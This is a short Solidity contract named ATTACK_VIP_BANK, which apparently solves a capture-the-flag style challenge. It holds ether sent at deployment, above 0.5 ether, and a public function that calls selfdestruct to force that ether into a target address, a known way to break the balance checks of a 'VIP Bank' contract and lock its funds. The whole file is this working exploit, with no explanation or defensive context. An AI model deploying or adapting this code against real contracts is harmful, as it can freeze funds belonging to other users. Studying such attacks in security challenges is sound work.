// SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

// contract that attack VIP BANK contract
contract ATTACK_VIP_BANK{

    constructor () payable {
        require (msg.value > 0.5 ether , "send more than 0.5 ether please");
    }

    function destroy_vip_bank_contract (address payable receivingfundsaddress) public {
        selfdestruct(receivingfundsaddress);
    }



 
  
}